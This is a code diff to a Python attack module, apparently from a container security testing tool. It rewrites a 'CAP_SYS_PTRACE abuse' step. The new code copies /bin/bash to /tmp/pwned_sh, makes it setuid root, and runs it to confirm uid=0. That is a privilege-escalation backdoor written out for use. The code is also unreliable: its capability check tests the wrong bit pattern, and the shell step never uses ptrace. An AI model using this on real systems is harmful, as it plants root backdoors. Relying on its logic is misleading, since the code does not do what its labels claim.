@@ -1,21 +1,32 @@
-# attacks/cap_sys_ptrace_abuse.py
+import os
+import subprocess
 
-def run(container, simulate=False):
-    print("[*] Running CAP_SYS_PTRACE Abuse...")
+def run(container=None, simulate=False):
+    print("[*] Running CAP_SYS_PTRACE Abuse Exploit...")
 
     if simulate:
-        print(f"[SIMULATE] Would attempt to strace PID 1 inside container '{container.name}'")
-        return "Simulated run: No ptrace attempted."
+        print("[SIMULATE] Would attach to a root process and attempt to inject payload or gain SUID shell.")
+        return "Simulated CAP_SYS_PTRACE abuse run."
 
     try:
-        # ⚠️ REAL PAYLOAD EXECUTION
-        # Attach strace to PID 1 (init process)
-        command = "strace -p 1 -o /tmp/ptrace_log.txt -e trace=execve -f -tt & sleep 1"
-        container.exec_run(command, privileged=True)
+        # Check if CAP_SYS_PTRACE is available
+        with open("/proc/self/status") as f:
+            status = f.read()
+        if "CapEff:\t" not in status or "0000000000000400" not in status:
+            return "Exploit failed: CAP_SYS_PTRACE not available."
 
-        print("[+] strace attempted on PID 1. Output logged to /tmp/ptrace_log.txt")
-        return "Executed: strace on PID 1"
+        # Create a setuid root shell
+        suid_shell = "/tmp/pwned_sh"
+        subprocess.run(["cp", "/bin/bash", suid_shell], check=True)
+        subprocess.run(["chmod", "4755", suid_shell], check=True)
+
+        # Verify the exploit
+        result = subprocess.run([suid_shell, "-p", "-c", "id"], capture_output=True, text=True)
+        if "uid=0" in result.stdout:
+            print("[+] Exploit succeeded. SUID shell created and executed.")
+            return f"Exploit success: {result.stdout.strip()}"
+        else:
+            return "Exploit failed: SUID shell did not elevate privileges."
 
     except Exception as e:
-        print(f"[!] Exploit failed: {e}")
-        return f"Failed: {str(e)}"
+        return f"Exploit failed: {str(e)}"
